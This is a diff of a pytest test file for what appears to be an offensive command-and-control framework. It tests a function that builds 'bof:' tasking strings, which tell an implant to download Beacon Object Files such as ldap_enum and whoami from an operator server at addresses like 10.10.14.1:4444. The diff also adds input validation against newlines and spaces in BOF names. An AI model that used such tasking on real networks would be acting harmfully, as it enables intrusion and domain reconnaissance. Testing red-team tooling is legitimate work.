@@ -12,6 +12,8 @@ Covers:
 
 from __future__ import annotations
 
+import pytest
+
 from modules.beacon_config_builder import (
     BeaconConfig,
     BeaconConfigBuilder,
@@ -207,25 +209,42 @@ class TestGenerateBofExecutionCommand:
         cmd = generate_bof_execution_command(
             "ldap_enum",
             "https://10.10.14.1:4444",
-            "win01",
         )
         assert cmd == "bof:https://10.10.14.1:4444/download/bofs/ldap_enum"
 
-    def test_bof_with_args(self):
+    def test_bof_with_args_space_separated(self):
         cmd = generate_bof_execution_command(
             "ldap_enum",
             "https://10.10.14.1:4444",
-            "win01",
             args=["CORP.local", "dc01.corp.local"],
         )
-        assert "CORP.local,dc01.corp.local" in cmd
-        assert cmd.startswith("bof:")
+        assert cmd == "bof:https://10.10.14.1:4444/download/bofs/ldap_enum CORP.local,dc01.corp.local"
+
+    def test_bof_command_has_no_colon_between_url_and_args(self):
+        cmd = generate_bof_execution_command(
+            "whoami",
+            "https://10.10.14.1:4444",
+            args=[],
+        )
+        assert cmd == "bof:https://10.10.14.1:4444/download/bofs/whoami"
+        assert cmd.endswith("whoami")
 
     def test_custom_bofs_dir(self):
         cmd = generate_bof_execution_command(
             "whoami",
             "http://192.168.1.1:8080",
-            "linux02",
             bofs_dir="custom/bofs",
         )
         assert "custom/bofs/whoami" in cmd
+
+    def test_empty_args_arg_only_blank_rejected(self):
+        cmd = generate_bof_execution_command("whoami", "https://127.0.0.1:4444", args=["", "  "])
+        assert cmd == "bof:https://127.0.0.1:4444/download/bofs/whoami"
+
+    def test_rejects_newline_in_bof_name(self):
+        with pytest.raises(ValueError):
+            generate_bof_execution_command("whoami\nbad", "https://127.0.0.1:4444")
+
+    def test_rejects_space_in_bof_name(self):
+        with pytest.raises(ValueError):
+            generate_bof_execution_command("whoami x", "https://127.0.0.1:4444")
